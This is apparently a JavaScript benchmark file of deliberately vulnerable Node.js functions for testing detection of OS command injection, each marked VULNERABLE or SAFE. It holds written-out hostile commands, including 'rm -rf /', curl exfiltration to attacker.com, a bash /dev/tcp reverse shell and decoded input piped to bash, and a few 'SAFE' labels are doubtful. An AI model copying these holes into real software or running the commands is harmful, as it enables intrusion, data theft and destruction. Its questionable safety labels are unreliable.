
// Comprehensive OS Command Injection Benchmarks (CWE-78)
// Covers all Node.js child_process functions and real-world patterns

const { exec, execSync, execFile, execFileSync, spawn, spawnSync, fork } = require('child_process');
const { system } = require('os');

// ============================================================================
// PART 1: Basic Vulnerable Patterns
// ============================================================================

// 1.1. exec() with Direct Concatenation
function cmd_exec_concat(req) {
    const userInput = req.query.file;
    // VULNERABLE: Direct string concatenation
    exec(`cat ${userInput}`, (error, stdout) => {
        console.log(stdout);
    });
}

// 1.2. execSync() with Concatenation
function cmd_exec_sync_concat(req) {
    const userInput = req.query.cmd;
    // VULNERABLE: Synchronous execution
    const output = execSync(`ls -la ${userInput}`);
    return output.toString();
}

// 1.3. execFile() with Args Array (Safe) vs String (Vulnerable)
function cmd_exec_file_safe(req) {
    const file = req.query.file;
    // SAFE: Using array form
    execFile('ls', ['-la', file], (error, stdout) => {
        console.log(stdout);
    });
}

function cmd_exec_file_vulnerable(req) {
    const file = req.query.file;
    // VULNERABLE: Passing single string argument
    execFile('bash', ['-c', `ls -la ${file}`], (error, stdout) => {
        console.log(stdout);
    });
}

// 1.4. spawn() with Shell
function cmd_spawn_vulnerable(req) {
    const cmd = req.query.cmd;
    // VULNERABLE: spawn with shell option
    spawn('sh', ['-c', `echo ${cmd}`], { shell: true });
}

function cmd_spawn_safe(req) {
    const cmd = req.query.cmd;
    // SAFE: spawn without shell
    spawn('echo', [cmd]);
}

// 1.5. fork() with Concatenated Args
function cmd_fork_vulnerable(req) {
    const script = req.query.script;
    // VULNERABLE: fork with dynamic script
    fork(`./${script}`);
}

// ============================================================================
// PART 2: Command Separators and Chaining
// ============================================================================

// 2.1. Command Chaining with ;
function cmd_chain_semicolon(req) {
    const file = req.query.file;
    // VULNERABLE: ; allows command chaining
    exec(`cat ${file}; rm -rf /`);
}

// 2.2. Command Chaining with &&
function cmd_chain_and(req) {
    const file = req.query.file;
    // VULNERABLE: && allows command chaining
    exec(`cat ${file} && whoami`);
}

// 2.3. Command Chaining with ||
function cmd_chain_or(req) {
    const file = req.query.file;
    // VULNERABLE: || allows command chaining
    exec(`cat ${file} || echo 'failed'`);
}

// 2.4. Command Chaining with |
function cmd_chain_pipe(req) {
    const file = req.query.file;
    // VULNERABLE: | allows command piping
    exec(`cat ${file} | grep 'password'`);
}

// 2.5. Command Chaining with &
function cmd_chain_background(req) {
    const file = req.query.file;
    // VULNERABLE: & runs in background
    exec(`sleep 5 & cat ${file}`);
}

// 2.6. Command Chaining with \n
function cmd_chain_newline(req) {
    const cmds = req.query.cmds;
    // VULNERABLE: Newline allows command separation
    exec(`echo 'test\n${cmds}'`);
}

// ============================================================================
// PART 3: Special Characters and Meta-Characters
// ============================================================================

// 3.1. Backticks for Command Substitution
function cmd_backticks(req) {
    const file = req.query.file;
    // VULNERABLE: Backticks for command substitution
    exec(`cat $(echo ${file})`);
}

// 3.2. $() for Command Substitution
function cmd_dollar_paren(req) {
    const file = req.query.file;
    // VULNERABLE: $() for command substitution
    exec(`cat $(whoami) && ls ${file}`);
}

// 3.3. Variable Substitution
function cmd_variable_substitution(req) {
    const varName = req.query.var;
    // VULNERABLE: Variable substitution
    exec(`echo $${varName}`);
}

// 3.4. Wildcard Expansion
function cmd_wildcard(req) {
    const pattern = req.query.pattern;
    // VULNERABLE: Wildcard expansion
    exec(`ls ${pattern}`);
}

// 3.5. Globbing Patterns
function cmd_globbing(req) {
    const ext = req.query.ext;
    // VULNERABLE: Globbing patterns
    exec(`rm -rf *.${ext}`);
}

// ============================================================================
// PART 4: Template Literals and String Interpolation
// ============================================================================

// 4.1. Template Literal Injection
function cmd_template_literal(req) {
    const cmd = req.query.cmd;
    const arg = req.query.arg;
    // VULNERABLE: Template literal
    exec(`${cmd} ${arg}`);
}

// 4.2. Multiple Template Variables
function cmd_template_multi(req) {
    const file = req.query.file;
    const option = req.query.option;
    const output = req.query.output;
    // VULNERABLE: Multiple template variables
    exec(`ls ${option} ${file} > ${output}`);
}

// 4.3. Nested Template Literals
function cmd_template_nested(req) {
    const inner = req.query.inner;
    const outer = req.query.outer;
    // VULNERABLE: Nested template literals
    const cmd = `${outer} $(echo ${inner})`;
    exec(cmd);
}

// ============================================================================
// PART 5: Real-World Application Patterns
// ============================================================================

// 5.1. File Upload with Processing
function cmd_file_upload(req) {
    const filename = req.file.filename;
    // VULNERABLE: Processing uploaded file
    exec(`convert /uploads/${filename} /processed/${filename}`);
}

// 5.2. Image Processing
function cmd_image_process(req) {
    const image = req.query.image;
    const size = req.query.size;
    // VULNERABLE: ImageMagick with user input
    exec(`convert ${image} -resize ${size} output.jpg`);
}

// 5.3. PDF Generation
function cmd_pdf_generate(req) {
    const html = req.query.html;
    const output = req.query.output;
    // VULNERABLE: wkhtmltopdf with user input
    exec(`wkhtmltopdf ${html} ${output}`);
}

// 5.4. Video Processing
function cmd_video_process(req) {
    const input = req.query.input;
    const output = req.query.output;
    // VULNERABLE: FFmpeg with user input
    exec(`ffmpeg -i ${input} ${output}`);
}

// 5.5. Network Diagnostic Tools
function cmd_network_diag(req) {
    const host = req.query.host;
    // VULNERABLE: ping with user input
    exec(`ping -c 4 ${host}`);
}

function cmd_dns_lookup(req) {
    const domain = req.query.domain;
    // VULNERABLE: nslookup with user input
    exec(`nslookup ${domain}`);
}

// 5.6. System Information
function cmd_sysinfo(req) {
    const command = req.query.cmd;
    // VULNERABLE: Any system command
    exec(`${command}`);
}

// 5.7. Archive Extraction
function cmd_archive_extract(req) {
    const archive = req.query.archive;
    const dest = req.query.dest;
    // VULNERABLE: tar extraction with path
    exec(`tar -xf ${archive} -C ${dest}`);
}

// 5.8. Backup Operations
function cmd_backup(req) {
    const path = req.query.path;
    // VULNERABLE: rsync with user path
    exec(`rsync -av ${path} /backup/`);
}

// 5.9. Log Rotation
function cmd_log_rotation(req) {
    const logFile = req.query.logfile;
    // VULNERABLE: logrotate with user input
    exec(`logrotate -f ${logFile}`);
}

// 5.10. Cron Job Management
function cmd_cron(req) {
    const schedule = req.query.schedule;
    const command = req.query.command;
    // VULNERABLE: crontab manipulation
    exec(`echo "${schedule} ${command}" | crontab -`);
}

// ============================================================================
// PART 6: Complex Flow Scenarios
// ============================================================================

// 6.1. Flow Through Functions
function cmd_flow_function(req) {
    const cmd = req.query.cmd;
    const sanitized = sanitize(cmd);
    // VULNERABLE: Broken sanitization
    exec(sanitized);
}

function sanitize(input) {
    // Ineffective: only removes spaces
    return input.replace(/ /g, '');
}

// 6.2. Flow Through Object
function cmd_flow_object(req) {
    const data = req.query;
    // VULNERABLE: Object property access
    exec(`ls ${data.path}`);
}

// 6.3. Flow Through Array
function cmd_flow_array(req) {
    const files = req.query.files;
    // VULNERABLE: Array iteration
    files.forEach(file => {
        exec(`cat ${file}`);
    });
}

// 6.4. Flow Through Conditional
function cmd_flow_conditional(req) {
    const action = req.query.action;
    const target = req.query.target;

    if (action === 'read') {
        exec(`cat ${target}`);
    } else if (action === 'write') {
        exec(`echo 'data' > ${target}`);
    }
}

// 6.5. Flow Through Loop with Concatenation
function cmd_flow_loop_concat(req) {
    const base = req.query.base;
    const suffix = req.query.suffix;

    for (let i = 0; i < 5; i++) {
        const filename = `${base}${i}${suffix}`;
        exec(`touch ${filename}`);
    }
}

// ============================================================================
// PART 7: Filter Evasion Patterns
// ============================================================================

// 7.1. Case Variation
function cmd_filter_case(req) {
    const cmd = req.query.cmd;
    // VULNERABLE: Case variations
    exec(`${cmd}`);
}

// 7.2. Encoding Bypass
function cmd_filter_encoding(req) {
    const cmd = req.query.cmd;
    // VULNERABLE: Hex/octal encoding
    exec(`echo $(printf '\\x${cmd}')`);
}

// 7.3. Quote Bypass
function cmd_filter_quotes(req) {
    const cmd = req.query.cmd;
    // VULNERABLE: Single quotes bypass double quote filters
    exec(`echo '${cmd}'`);
}

// 7.4. Backslash Escaping
function cmd_filter_backslash(req) {
    const cmd = req.query.cmd;
    // VULNERABLE: Backslash escaping
    exec(`echo ${cmd}\\nwhoami`);
}

// 7.5. Comment Bypass
function cmd_filter_comment(req) {
    const cmd = req.query.cmd;
    // VULNERABLE: Comment to hide injection
    exec(`ls # ${cmd}`);
}

// ============================================================================
// PART 8: Safe Patterns - Precision Testing
// ============================================================================

// 8.1. Using Array Form with spawn()
function cmd_safe_spawn_array(req) {
    const file = req.query.file;
    // SAFE: Array form prevents shell injection
    spawn('ls', ['-la', file]);
}

// 8.2. Using Array Form with execFile()
function cmd_safe_execfile_array(req) {
    const file = req.query.file;
    // SAFE: Array form
    execFile('cat', [file], (error, stdout) => {
        console.log(stdout);
    });
}

// 8.3. Whitelist Command Validation
function cmd_safe_whitelist(req) {
    const cmd = req.query.cmd;
    const allowed = ['ls', 'cat', 'pwd', 'date'];

    // SAFE: Whitelist validation
    if (!allowed.includes(cmd)) {
        throw new Error('Command not allowed');
    }

    const arg = req.query.arg;
    // Still need to validate arg too
    spawn(cmd, [arg]);
}

// 8.4. Input Validation with Regex
function cmd_safe_regex(req) {
    const filename = req.query.filename;
    // SAFE: Regex validation for filename
    if (!/^[a-zA-Z0-9_.-]+$/.test(filename)) {
        throw new Error('Invalid filename');
    }

    execFile('cat', [filename]);
}

// 8.5. Using a Command Library (shelljs)
function cmd_safe_shelljs(req) {
    const shell = require('shelljs');
    const filename = req.query.filename;

    // SAFE: shelljs provides safer execution
    shell.cat(filename);
}

// 8.6. Argument Validation
function cmd_safe_arg_validation(req) {
    const file = req.query.file;
    const allowedFiles = ['test.txt', 'data.json', 'config.ini'];

    // SAFE: Validate argument
    if (!allowedFiles.includes(file)) {
        throw new Error('File not allowed');
    }

    execFile('cat', [file]);
}

// 8.7. Path Validation
function cmd_safe_path_validation(req) {
    const path = req.query.path;
    const basePath = '/var/log';

    // SAFE: Path validation
    if (!path.startsWith(basePath)) {
        throw new Error('Invalid path');
    }

    execFile('ls', [path]);
}

// 8.8. Length Limitation
function cmd_safe_length_limit(req) {
    const cmd = req.query.cmd;
    // SAFE: Length limitation
    if (cmd.length > 100) {
        throw new Error('Command too long');
    }

    // Still need other validations
    spawn(cmd, []);
}

// 8.9. Using a Dedicated Process Library
function cmd_safe_process_manager(req) {
    const pm2 = require('pm2');
    const script = req.query.script;
    const allowedScripts = ['app.js', 'worker.js'];

    // SAFE: Using PM2 with validation
    if (!allowedScripts.includes(script)) {
        throw new Error('Script not allowed');
    }

    pm2.start(script);
}

// 8.10. Context-Aware Escaping (Limited Protection)
function cmd_safe_escape(req) {
    const file = req.query.file;
    // LIMITED SAFE: Shell escaping (not perfect)
    const escaped = file.replace(/'/g, "'\\''");
    exec(`cat '${escaped}'`);
}

// ============================================================================
// PART 9: Advanced Attack Patterns
// ============================================================================

// 9.1. Blind Command Injection
function cmd_blind_timing(req) {
    const file = req.query.file;
    // VULNERABLE: Time-based blind injection
    exec(`sleep $(cat ${file})`);
}

// 9.2. Out-of-Band Injection
function cmd_oob_curl(req) {
    const exfil = req.query.data;
    // VULNERABLE: Exfiltration via curl
    exec(`curl http://attacker.com/${exfil}`);
}

// 9.3. Reverse Shell
function cmd_reverse_shell(req) {
    const ip = req.query.ip;
    const port = req.query.port;
    // VULNERABLE: Reverse shell
    exec(`bash -i >& /dev/tcp/${ip}/${port} 0>&1`);
}

// 9.4. Base64 Encoded Commands
function cmd_base64(req) {
    const encoded = req.query.cmd;
    // VULNERABLE: Base64 encoded command
    exec(`echo ${encoded} | base64 -d | bash`);
}

// 9.5. Hex Encoded Commands
function cmd_hex(req) {
    const hex = req.query.hex;
    // VULNERABLE: Hex encoded command
    exec(`printf '${hex}' | xxd -r -p | bash`);
}

// 9.6. Environment Variable Injection
function cmd_env_injection(req) {
    const name = req.query.name;
    const value = req.query.value;
    // VULNERABLE: Environment variable manipulation
    process.env[name] = value;
    exec(`echo $${name}`);
}

// 9.7. PATH Manipulation
function cmd_path_manipulation(req) {
    const path = req.query.path;
    // VULNERABLE: PATH manipulation
    process.env.PATH = path;
    exec('unknown_command');
}

// 9.8. LD_PRELOAD Injection
function cmd_ld_preload(req) {
    const library = req.query.lib;
    // VULNERABLE: LD_PRELOAD injection
    process.env.LD_PRELOAD = library;
    exec('ls');
}

// 9.9. IFS Manipulation
function cmd_ifs(req) {
    const cmd = req.query.cmd;
    // VULNERABLE: IFS manipulation
    process.env.IFS = '/';
    exec(`echo${IFS}${cmd}`);
}

// 9.10. Alias Poisoning
function cmd_alias(req) {
    const name = req.query.name;
    const cmd = req.query.cmd;
    // VULNERABLE: Alias poisoning
    exec(`alias ${name}='${cmd}'`);
}

module.exports = {
    // Part 1: Basic Vulnerable Patterns
    cmd_exec_concat,
    cmd_exec_sync_concat,
    cmd_exec_file_safe,
    cmd_exec_file_vulnerable,
    cmd_spawn_vulnerable,
    cmd_spawn_safe,
    cmd_fork_vulnerable,

    // Part 2: Command Separators
    cmd_chain_semicolon,
    cmd_chain_and,
    cmd_chain_or,
    cmd_chain_pipe,
    cmd_chain_background,
    cmd_chain_newline,

    // Part 3: Special Characters
    cmd_backticks,
    cmd_dollar_paren,
    cmd_variable_substitution,
    cmd_wildcard,
    cmd_globbing,

    // Part 4: Template Literals
    cmd_template_literal,
    cmd_template_multi,
    cmd_template_nested,

    // Part 5: Real-World Patterns
    cmd_file_upload,
    cmd_image_process,
    cmd_pdf_generate,
    cmd_video_process,
    cmd_network_diag,
    cmd_dns_lookup,
    cmd_sysinfo,
    cmd_archive_extract,
    cmd_backup,
    cmd_log_rotation,
    cmd_cron,

    // Part 6: Complex Flow
    cmd_flow_function,
    sanitize,
    cmd_flow_object,
    cmd_flow_array,
    cmd_flow_conditional,
    cmd_flow_loop_concat,

    // Part 7: Filter Evasion
    cmd_filter_case,
    cmd_filter_encoding,
    cmd_filter_quotes,
    cmd_filter_backslash,
    cmd_filter_comment,

    // Part 8: Safe Patterns
    cmd_safe_spawn_array,
    cmd_safe_execfile_array,
    cmd_safe_whitelist,
    cmd_safe_regex,
    cmd_safe_shelljs,
    cmd_safe_arg_validation,
    cmd_safe_path_validation,
    cmd_safe_length_limit,
    cmd_safe_process_manager,
    cmd_safe_escape,

    // Part 9: Advanced Attacks
    cmd_blind_timing,
    cmd_oob_curl,
    cmd_reverse_shell,
    cmd_base64,
    cmd_hex,
    cmd_env_injection,
    cmd_path_manipulation,
    cmd_ld_preload,
    cmd_ifs,
    cmd_alias
};
